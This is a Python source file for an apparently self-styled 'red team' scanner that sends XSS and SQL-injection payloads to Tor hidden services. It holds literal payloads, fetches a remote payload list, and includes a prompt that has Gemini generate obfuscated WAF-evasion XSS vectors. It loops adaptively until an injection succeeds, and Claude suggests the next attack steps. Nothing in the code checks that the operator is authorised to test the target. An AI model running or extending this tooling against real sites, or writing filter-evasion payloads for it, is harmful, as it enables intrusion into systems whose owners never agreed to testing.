#!/usr/bin/env python3
"""
🦇 RED TEAM MODULE - Batmobile Edition
AI-powered Security Testing for Isolated Tor Hidden Services
Combines local scans with secure AI analysis (No Raw Data Leaks)

Dual-AI Setup:
- Claude: Strategic Analysis & Pattern Recognition
- Gemini: Offensive Payload Generation & Obfuscation
"""

import requests
import json
import time
import hashlib
from typing import Dict, List, Optional
from dataclasses import dataclass, asdict
from anthropic import Anthropic
from google import genai
from google.genai import types
import subprocess
from urllib.parse import urlparse, urljoin, unquote, quote
import html
import re
from collections import Counter
import os

# ============================================================================
# CONFIGURATION
# ============================================================================

TOR_PROXIES = {
    'scan_circuit': 'socks5h://127.0.0.1:9050',    # Dedicated scan circuit
    'recon_circuit': 'socks5h://127.0.0.1:9051',   # Recon circuit
    'verify_circuit': 'socks5h://127.0.0.1:9052'   # Verification circuit
}

CLAUDE_MODEL = "claude-sonnet-4-20250514"

# Payload Library (fallback if Gemini fails)
XSSPY_PAYLOADS_URL = "https://raw.githubusercontent.com/VolkanSah/XSSPY-NCF/refs/heads/main/payloads.txt"

# Detection Marker (integrated by Gemini into payloads)
REDTEAM_MARKER = "RedTeamBreak"

# ============================================================================
# DATA STRUCTURES
# ============================================================================

@dataclass
class ScanResult:
    """Abstracted Scan Result (NO Raw Data!)"""
    target_hash: str  # SHA256 of the URL (not the URL itself!)
    scan_type: str
    vulnerability_found: bool
    severity: str  # "low", "medium", "high", "critical", "info", "error"
    response_pattern: str  # Abstracted: "reflected", "blocked", "sanitized", "timeout"
    status_code: int
    timing_ms: float
    headers_fingerprint: str  # Hash/JSON of the Security Headers
    anomaly_score: float  # 0.0-1.0

@dataclass
class TargetProfile:
    """Target Profile without sensitive information"""
    target_hash: str
    technology_stack: List[str]  # ["Apache", "PHP"] etc.
    security_headers: Dict[str, bool]  # {"CSP": True, "XFO": False}
    circuit_stability: float
    avg_response_time: float

# ============================================================================
# SECURE SCANNING ENGINE
# ============================================================================

class SecureRedTeamScanner:
    def __init__(self, claude_api_key: Optional[str] = None, gemini_api_key: Optional[str] = None):
        self.claude = Anthropic(api_key=claude_api_key) if claude_api_key else None
        self.gemini = genai.Client(api_key=gemini_api_key) if gemini_api_key else None
        self.scan_history: List[ScanResult] = []
        self.xsspy_payloads: List[str] = []  # Cache for external payloads
        self._load_xsspy_payloads()
        
    def _hash_target(self, url: str) -> str:
        """Anonymizes target URL to hash"""
        return hashlib.sha256(url.encode()).hexdigest()[:16]
        
    def _load_xsspy_payloads(self):
        """Loads the external payload list as a fallback"""
        try:
            response = requests.get(XSSPY_PAYLOADS_URL, timeout=10)
            if response.status_code == 200:
                # Parse Payloads (one per line)
                self.xsspy_payloads = [
                    p.strip() for p in response.text.split('\n') 
                    if p.strip() and not p.startswith('#')
                ]
                print(f"[+] Loaded {len(self.xsspy_payloads)} XSSpy payloads")
        except Exception as e:
            print(f"[!] Could not load XSSpy payloads: {e}")
            self.xsspy_payloads = []
        
    def _detect_xss_reflection(self, payload: str, response_text: str) -> bool:
        """
        Robust XSS Detection using multiple strategies
        
        Handles: URL-encoding, HTML-entities, Partial-Reflection
        Solution: Multi-Layer Check
        """
        
        # Layer 1: Direct Match (ideal case)
        if payload in response_text:
            return True
        
        # Layer 2: URL-decoded Payload
        decoded_payload = unquote(payload)
        if decoded_payload in response_text:
            return True
        
        # Layer 3: HTML-decoded Response
        decoded_response = html.unescape(response_text)
        if payload in decoded_response or decoded_payload in decoded_response:
            return True
        
        # Layer 4: Marker-based (for Gemini payloads)
        if REDTEAM_MARKER in payload:
            # Search for marker in response (more robust than the whole payload)
            if REDTEAM_MARKER in response_text or REDTEAM_MARKER in decoded_response:
                return True
        
        # Layer 5: Critical XSS Patterns in Response
        xss_indicators = [
            '<script', 'onerror=', 'onload=', 'javascript:', 
            'eval(', 'alert(', 'prompt(', 'confirm('
        ]
        
        # If the payload contains one of these AND it is reflected
        for indicator in xss_indicators:
            if indicator in payload.lower():
                if indicator in response_text.lower():
                    # Additional Validation: Not just in HTML, but in JS context
                    return self._validate_js_context(response_text, indicator)
        
        return False
        
    def _validate_js_context(self, response_text: str, indicator: str) -> bool:
        """
        Checks if the indicator is in an executable JS context (not just in HTML text)
        """
        # Simple heuristic: Search for JS-Context-Patterns
        js_contexts = [
            f'<script>{indicator}',
            f'<script type="text/javascript">{indicator}',
            f'{indicator}</script>',
            r'on[a-z]+=' + re.escape(indicator),  # Event handler
        ]
        
        for pattern in js_contexts:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
        
        return False
        
    def _get_circuit_proxy(self, scan_type: str) -> Dict[str, str]:
        """Selects isolated circuit based on scan type"""
        circuit_map = {
            'xss': TOR_PROXIES['scan_circuit'],
            'sqli': TOR_PROXIES['scan_circuit'],
            'recon': TOR_PROXIES['recon_circuit'],
            'verify': TOR_PROXIES['verify_circuit']
        }
        proxy = circuit_map.get(scan_type, TOR_PROXIES['scan_circuit'])
        return {'http': proxy, 'https': proxy}
        
    def _extract_safe_fingerprint(self, response: requests.Response) -> Dict:
        """Extracts only structural information, NO content"""
        security_headers = {
            'CSP': 'Content-Security-Policy' in response.headers,
            'XFO': 'X-Frame-Options' in response.headers,
            'HSTS': 'Strict-Transport-Security' in response.headers,
            'XSS-Protection': 'X-XSS-Protection' in response.headers
        }
        
        # Server Fingerprint (type only, not version!)
        server = response.headers.get('Server', 'unknown')
        server_type = server.split('/')[0] if '/' in server else server
        
        return {
            'security_headers': security_headers,
            'server_type': server_type,
            'headers_count': len(response.headers),
            'body_length_bucket': self._bucket_size(len(response.text))
        }
        
    def _bucket_size(self, size: int) -> str:
        """Abstracts exact sizes to buckets"""
        if size < 1000: return "tiny"
        elif size < 10000: return "small"
        elif size < 100000: return "medium"
        else: return "large"
        
    def _calculate_anomaly_score(self, response: requests.Response, 
                                  expected_pattern: str) -> float:
        """Calculates Anomaly Score locally (no AI needed)"""
        score = 0.0
        
        # Unexpected Status Codes
        if response.status_code not in [200, 403, 404]:
            score += 0.3
        
        # Missing Security Headers
        if 'Content-Security-Policy' not in response.headers:
            score += 0.2
        
        # Payload Reflection (generic)
        if expected_pattern and expected_pattern in response.text:
            score += 0.5
        
        return min(score, 1.0)
        
    # ========================================================================
    # SCANNING FUNCTIONS
    # ========================================================================
        
    def run_xss_scan(self, target_onion_url: str) -> ScanResult:
        """
        [TOOL] Executes XSS scan over isolated Tor circuit.
        Returns ONLY abstracted results.
        """
        if not target_onion_url.endswith(".onion"):
            raise ValueError("Invalid .onion URL")
        
        target_hash = self._hash_target(target_onion_url)
        proxies = self._get_circuit_proxy('xss')
        
        # XSS Test Payloads (harmless, for detection only)
        test_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)"
        ]
        
        start_time = time.time()
        vulnerability_found = False
        response_pattern = "sanitized"
        status_code = 0
        
        try:
            for payload in test_payloads:
                test_url = f"{target_onion_url}/search?q={payload}"
                
                response = requests.get(
                    test_url, 
                    proxies=proxies, 
                    timeout=45,
                    headers={'User-Agent': 'RedTeam/Scanner'}
                )
                
                status_code = response.status_code
                fingerprint = self._extract_safe_fingerprint(response)
                
                # Local Analysis (NO raw content to AI!)
                if payload in response.text:
                    vulnerability_found = True
                    response_pattern = "reflected"
                    break
                elif status_code in [403, 406, 429]:
                    response_pattern = "blocked"
                    break
            
            timing_ms = (time.time() - start_time) * 1000
            anomaly_score = self._calculate_anomaly_score(response, test_payloads[0])
            
            severity = "critical" if vulnerability_found else "low"
            if response_pattern == "blocked":
                severity = "info"
            
            result = ScanResult(
                target_hash=target_hash,
                scan_type="xss",
                vulnerability_found=vulnerability_found,
                severity=severity,
                response_pattern=response_pattern,
                status_code=status_code,
                timing_ms=timing_ms,
                headers_fingerprint=json.dumps(fingerprint['security_headers']),
                anomaly_score=anomaly_score
            )
            
            self.scan_history.append(result)
            return result
            
        except requests.exceptions.Timeout:
            return ScanResult(
                target_hash=target_hash,
                scan_type="xss",
                vulnerability_found=False,
                severity="error",
                response_pattern="timeout",
                status_code=0,
                timing_ms=(time.time() - start_time) * 1000,
                headers_fingerprint="{}",
                anomaly_score=0.0
            )
        except Exception as e:
            return ScanResult(
                target_hash=target_hash,
                scan_type="xss",
                vulnerability_found=False,
                severity="error",
                response_pattern=f"error_{type(e).__name__}",
                status_code=0,
                timing_ms=0.0,
                headers_fingerprint="{}",
                anomaly_score=0.0
            )
        
    def run_sqli_scan(self, target_onion_url: str) -> ScanResult:
        """SQL Injection Scan (similar pattern to XSS)"""
        target_hash = self._hash_target(target_onion_url)
        proxies = self._get_circuit_proxy('sqli')
        
        sqli_payloads = [
            "' OR '1'='1",
            "1' UNION SELECT NULL--",
            "admin'--"
        ]
        
        # Similar logic to run_xss_scan
        # Implementation here...
        pass # Placeholder is kept for completeness
        
    def run_reconnaissance(self, target_onion_url: str) -> TargetProfile:
        """
        Passive profiling without aggressive scans.
        Collects only structural information.
        """
        target_hash = self._hash_target(target_onion_url)
        proxies = self._get_circuit_proxy('recon')
        
        try:
            response = requests.get(
                target_onion_url,
                proxies=proxies,
                timeout=30
            )
            
            fingerprint = self._extract_safe_fingerprint(response)
            
            # Technology Detection (local, without external requests!)
            tech_stack = []
            server = fingerprint['server_type'].lower()
            if 'apache' in server:
                tech_stack.append('Apache')
            elif 'nginx' in server:
                tech_stack.append('Nginx')
            
            # Additional local heuristics...
            
            return TargetProfile(
                target_hash=target_hash,
                technology_stack=tech_stack,
                security_headers=fingerprint['security_headers'],
                circuit_stability=1.0,  # Based on Tor metrics
                avg_response_time=response.elapsed.total_seconds()
            )
            
        except Exception:
            return TargetProfile(
                target_hash=target_hash,
                technology_stack=[],
                security_headers={},
                circuit_stability=0.0,
                avg_response_time=0.0
            )
        
    # ========================================================================
    # AI ANALYSIS (SAFE LAYER)
    # ========================================================================
        
    def analyze_with_claude(self, results: List[ScanResult]) -> str:
        """
        Sends ONLY abstracted scan results for AI analysis.
        NO Raw URLs, NO Payloads, NO Response Bodies!
        """
        if not self.claude:
            return "ERROR: Claude API not configured"
        
        # Build abstract report
        abstract_report = {
            'total_scans': len(results),
            'vulnerabilities_found': sum(r.vulnerability_found for r in results),
            'severity_distribution': self._get_severity_distribution(results),
            'response_patterns': self._get_pattern_distribution(results),
            'avg_anomaly_score': sum(r.anomaly_score for r in results) / len(results) if results else 0.0,
            'timing_analysis': {
                'avg_ms': sum(r.timing_ms for r in results) / len(results) if results else 0.0,
                'max_ms': max(r.timing_ms for r in results) if results else 0.0,
                'timeout_rate': sum(1 for r in results if r.response_pattern == 'timeout') / len(results) if results else 0.0
            }
        }
        
        prompt = f"""
You are a Red Team Security Analyst. Analyze this abstracted scan report:

{json.dumps(abstract_report, indent=2)}

IMPORTANT: 
- You see ONLY anonymized metrics
- NO real URLs or payloads
- NO response content

Tasks:
1. Evaluate the overall security of the target system (Score 0-10)
2. Identify critical patterns (e.g., "all XSS reflected" = bad)
3. Recommend the next scanning strategies
4. Detect possible IDS/WAF behavior from response patterns

Answer in JSON format:
{{
  "security_score": 0-10,
  "critical_findings": ["..."],
  "recommended_scans": ["..."],
  "waf_detected": true/false,
  "analysis": "..."
}}
"""
        
        try:
            message = self.claude.messages.create(
                model=CLAUDE_MODEL,
                max_tokens=2048,
                messages=[{"role": "user", "content": prompt}]
            )
            
            return message.content[0].text
            
        except Exception as e:
            return f"ERROR: Claude API Error - {e}"
        
    def generate_attack_payload_with_gemini(self, last_result: ScanResult) -> str:
        """
        [AI-TOOL] Uses Gemini to generate a new, obfuscated payload 
        based on the last scan result.
        
        Usage when:
        - WAF was detected (response_pattern == 'blocked')
        - Standard payloads were sanitized
        - Adaptive attacks are necessary
        """
        if not self.gemini:
            return "ERROR: Gemini API not configured"
        
        # Abstracted information for Gemini (NO sensitive data!)
        abstract_data = {
            'scan_type': last_result.scan_type,
            'response_pattern': last_result.response_pattern,
            'status_code': last_result.status_code,
            'security_headers': json.loads(last_result.headers_fingerprint),
            'anomaly_score': last_result.anomaly_score
        }
        
        # Context-based prompt with MARKER-Requirement!
        prompt = f"""
You are an experienced penetration tester. You have performed an automated scan.

Last Scan Result:
{json.dumps(abstract_data, indent=2)}

Analysis:
- Response Pattern: '{abstract_data['response_pattern']}'
- Status Code: {abstract_data['status_code']}
- Anomaly Score: {abstract_data['anomaly_score']}

TASK:
Generate an **obfuscated** XSS payload that attempts to bypass the detected filtering.

CRITICAL REQUIREMENTS:
1. The payload MUST contain the string "{REDTEAM_MARKER}" (for detection)
2. Avoid standard payloads like <script>alert(1)</script>
3. Use obfuscation techniques:
    - Event handlers without quotes (onload=alert`1`)
    - HTML Entities (&#x3C;script&#x3E;)
    - Unicode/UTF-7 Encoding
    - SVG/MathML Vectors
    - Template Literals
4. If Status 403/406: Use filter evasion with Encoding
5. If Status 200 + sanitized: Use alternative tags/attributes

IMPORTANT: Reply ONLY with the payload, NO explanations!

Examples (ALL must contain {REDTEAM_MARKER}):
- <svg/onload=alert('{REDTEAM_MARKER}')>
- <img src=x onerror=alert`{REDTEAM_MARKER}`>
- <details open ontoggle=alert('{REDTEAM_MARKER}')>
- <iframe srcdoc="&#x3C;script&#x3E;alert('{REDTEAM_MARKER}')&#x3C;/script&#x3E;">
"""
        
        try:
            response = self.gemini.models.generate_content(
                model='gemini-2.0-flash-exp',  # Faster for payload gen
                contents=prompt
            )
            
            # Extract and clean payload
            payload = response.text.strip()
            
            # Security Check: Payload must have Web Context AND Marker
            if REDTEAM_MARKER not in payload:
                print(f"[!] Warning: Gemini payload missing marker, adding it...")
                # Fallback: Add Marker
                if '<script>' in payload:
                    payload = payload.replace('<script>', f'<script>/*{REDTEAM_MARKER}*/')
                else:
                    payload = f"{payload}"
            
            if not any(char in payload for char in ['<', '>', '(', ')']):
                return "ERROR: Invalid payload generated"
            
            return payload
            
        except Exception as e:
            return f"ERROR: Gemini API Error - {e}"
        
    def get_xsspy_payload(self, iteration: int) -> Optional[str]:
        """
        Fetches a payload from the XSSpy list as a fallback
        
        Returns:
            Payload with injected REDTEAM_MARKER
        """
        if not self.xsspy_payloads:
            return None
        
        # Use iteration as index (with wrap-around)
        idx = iteration % len(self.xsspy_payloads)
        base_payload = self.xsspy_payloads[idx]
        
        # Inject Marker for Detection
        # Strategy: Insert as HTML comment or within a string
        if '<script>' in base_payload:
            modified = base_payload.replace('<script>', f'<script>/*{REDTEAM_MARKER}*/')
        elif 'alert(' in base_payload:
            modified = base_payload.replace('alert(', f'alert("{REDTEAM_MARKER}"+')
        else:
            # Fallback: Append as HTML comment
            modified = f"{base_payload}"
        
        return modified
        
    def adaptive_xss_scan(self, target_onion_url: str, max_iterations: int = 3) -> List[ScanResult]:
        """
        🔥 ADAPTIVE SCAN with AI-Feedback-Loop
        
        1. Standard XSS Scan
        2. If blocked → Gemini generates Evasion Payload
        3. If Gemini fails → Fallback to XSSpy list
        4. New scan with the generated payload
        5. Repeat until Success or max_iterations
        """
        results = []
        
        print(f"[*] Starting Adaptive XSS Scan (max {max_iterations} iterations)")
        
        # Iteration 1: Standard Scan
        result = self._run_custom_xss_scan(target_onion_url, self.get_xsspy_payload(0)) # Use first XSSpy payload as standard test
        results.append(result)
        
        print(f"    [1] Pattern: {result.response_pattern}, Score: {result.anomaly_score:.2f}")
        
        # If successful or Error → Stop
        if result.vulnerability_found or result.severity == "error":
            return results
        
        # Adaptive Iterations with Gemini + XSSpy Fallback
        for i in range(2, max_iterations + 1):
            print(f"    [*] Iteration {i}: Generating evasion payload...")
            
            # Try Gemini first
            if self.gemini:
                evasion_payload = self.generate_attack_payload_with_gemini(result)
                
                if not evasion_payload.startswith("ERROR"):
                    print(f"    [+] Gemini: {evasion_payload[:60]}...")
                else:
                    print(f"    [!] {evasion_payload}")
                    # Fallback to XSSpy
                    evasion_payload = self.get_xsspy_payload(i)
                    if evasion_payload:
                        print(f"    [+] XSSpy Fallback: {evasion_payload[:60]}...")
                    else:
                        print("    [!] No fallback payloads available")
                        break
            else:
                # No Gemini → Direct XSSpy
                evasion_payload = self.get_xsspy_payload(i)
                if evasion_payload:
                    print(f"    [+] XSSpy: {evasion_payload[:60]}...")
                else:
                    print("    [!] No payloads available")
                    break
            
            # New scan with generated payload
            result = self._run_custom_xss_scan(target_onion_url, evasion_payload)
            results.append(result)
            
            print(f"    [{i}] Pattern: {result.response_pattern}, Score: {result.anomaly_score:.2f}")
            
            # Success? Stop!
            if result.vulnerability_found:
                print(f"    [✓✓✓] BREAKTHROUGH! Vulnerability confirmed!")
                print(f"          Successful payload: {evasion_payload[:80]}...")
                break
        
        return results
        
    def _run_custom_xss_scan(self, target_onion_url: str, payload: str) -> ScanResult:
        """
        Executes XSS scan with a custom payload
        
        Uses robust Multi-Layer Detection:
        - URL-Decoding
        - HTML-Entity-Decoding
        - Marker-based detection (RedTeamBreak)
        - JS-Context validation
        """
        target_hash = self._hash_target(target_onion_url)
        proxies = self._get_circuit_proxy('xss')
        
        start_time = time.time()
        
        try:
            # URL-encode Payload for secure transmission
            encoded_payload = quote(payload)
            test_url = f"{target_onion_url}/search?q={encoded_payload}"
            
            response = requests.get(
                test_url,
                proxies=proxies,
                timeout=45,
                headers={'User-Agent': 'RedTeam/Scanner'}
            )
            
            # Robust Detection (Multi-Layer!)
            vulnerability_found = self._detect_xss_reflection(payload, response.text)
            
            # Pattern determination
            if vulnerability_found:
                response_pattern = "reflected"
            elif response.status_code in [403, 406, 429]:
                response_pattern = "blocked"
            else:
                response_pattern = "sanitized"
            
            timing_ms = (time.time() - start_time) * 1000
            fingerprint = self._extract_safe_fingerprint(response)
            
            result = ScanResult(
                target_hash=target_hash,
                scan_type="xss_adaptive",
                vulnerability_found=vulnerability_found,
                severity="critical" if vulnerability_found else "low",
                response_pattern=response_pattern,
                status_code=response.status_code,
                timing_ms=timing_ms,
                headers_fingerprint=json.dumps(fingerprint['security_headers']),
                anomaly_score=self._calculate_anomaly_score(response, payload)
            )
            
            self.scan_history.append(result)
            return result
            
        except Exception as e:
            return ScanResult(
                target_hash=target_hash,
                scan_type="xss_adaptive",
                vulnerability_found=False,
                severity="error",
                response_pattern=f"error_{type(e).__name__}",
                status_code=0,
                timing_ms=(time.time() - start_time) * 1000,
                headers_fingerprint="{}",
                anomaly_score=0.0
            )
        
    def _get_severity_distribution(self, results: List[ScanResult]) -> Dict[str, int]:
        """Counts severity levels"""
        return dict(Counter(r.severity for r in results))
        
    def _get_pattern_distribution(self, results: List[ScanResult]) -> Dict[str, int]:
        """Counts response patterns"""
        return dict(Counter(r.response_pattern for r in results))
        
    # ========================================================================
    # REPORTING
    # ========================================================================
        
    def generate_report(self, include_ai_analysis: bool = True) -> str:
        """Generates the final report"""
        if not self.scan_history:
            return "No scans performed."
        
        report = "=" * 60 + "\n"
        report += "🦇 RED TEAM SCAN REPORT - Batmobile Edition\n"
        report += "=" * 60 + "\n\n"
        
        # Summary
        total = len(self.scan_history)
        vulns = sum(1 for r in self.scan_history if r.vulnerability_found)
        
        report += f"Total Scans: {total}\n"
        report += f"Vulnerabilities Found: {vulns}\n"
        report += f"Success Rate: {(vulns/total*100):.1f}%\n\n"
        
        # Individual Scans (anonymized!)
        for i, result in enumerate(self.scan_history, 1):
            report += f"[{i}] Target: {result.target_hash}\n"
            report += f"    Type: {result.scan_type.upper()}\n"
            report += f"    Status: {'VULNERABLE' if result.vulnerability_found else 'SECURE'}\n"
            report += f"    Pattern: {result.response_pattern}\n"
            report += f"    Anomaly: {result.anomaly_score:.2f}\n\n"
        
        # AI Analysis (if enabled)
        if include_ai_analysis and self.claude:
            report += "\n" + "=" * 60 + "\n"
            report += "🤖 AI ANALYSIS (Claude)\n"
            report += "=" * 60 + "\n"
            ai_analysis = self.analyze_with_claude(self.scan_history)
            report += ai_analysis + "\n"
        
        return report

# ============================================================================
# USAGE EXAMPLE
# ============================================================================

if __name__ == "__main__":
    # Init Scanner with BOTH AIs
    scanner = SecureRedTeamScanner(
        claude_api_key=os.getenv('ANTHROPIC_API_KEY'),
        gemini_api_key=os.getenv('GEMINI_API_KEY')
    )
    
    # Example Target
    targets = [
        "http://example1234567890ab.onion"
    ]
    
    print("🦇 Starting Dual-AI Red Team Scan...")
    print("    Claude: Strategic Analysis")
    print("    Gemini: Offensive Payload Generation\n")
    
    for target in targets:
        print(f"\n[*] Target: {scanner._hash_target(target)}")
        
        # 1. Reconnaissance
        profile = scanner.run_reconnaissance(target)
        print(f"    Tech: {profile.technology_stack}")
        
        # 2. ADAPTIVE XSS Scan with AI-Feedback-Loop! 🔥
        print(f"\n[*] Running Adaptive XSS Scan...")
        adaptive_results = scanner.adaptive_xss_scan(target, max_iterations=3)
        
        print(f"\n[+] Completed {len(adaptive_results)} iterations")
        if any(r.vulnerability_found for r in adaptive_results):
            print("    [✓✓✓] VULNERABILITY CONFIRMED!")
        else:
            print("    [~] Target appears hardened")
    
    # Final Report with Claude Analysis
    print("\n" + "="*60)
    print(scanner.generate_report(include_ai_analysis=True))
